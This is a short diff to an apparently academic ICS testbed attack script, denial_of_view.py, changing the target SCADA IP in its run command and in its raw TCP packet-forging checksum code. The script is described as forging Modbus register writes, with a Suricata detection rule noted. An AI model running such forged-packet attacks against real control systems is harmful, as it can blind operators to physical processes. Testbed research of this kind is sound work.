@@ -20,7 +20,7 @@ Detection: Suricata catches the forged holding register writes
 (SID 9000001).
 
 Run this ON THE ATTACKER HOST:
-    python3 attacks/denial_of_view.py --scada-ip 10.0.0.10 --plc-ip 10.0.0.1
+    python3 attacks/denial_of_view.py --scada-ip 10.0.0.20 --plc-ip 10.0.0.1
 
 ACADEMIC USE ONLY — isolated testbed, no production systems.
 """
@@ -108,7 +108,7 @@ def _build_tcp_header(src_port: int, dst_port: int, seq: int, ack: int,
         (data_offset << 4) | flags, window, checksum, urgent)
     # Pseudo-header for checksum
     src_bytes = socket.inet_aton("10.0.0.66")  # attacker IP
-    dst_bytes = socket.inet_aton("10.0.0.10")  # SCADA IP
+    dst_bytes = socket.inet_aton("10.0.0.20")  # SCADA IP
     pseudo = struct.pack(">4s4sBBH", src_bytes, dst_bytes,
                           0, 6, len(header) + len(payload))
     s = sum(struct.unpack("!%dH" % ((len(pseudo) + len(header) + len(payload) + 1) // 2),
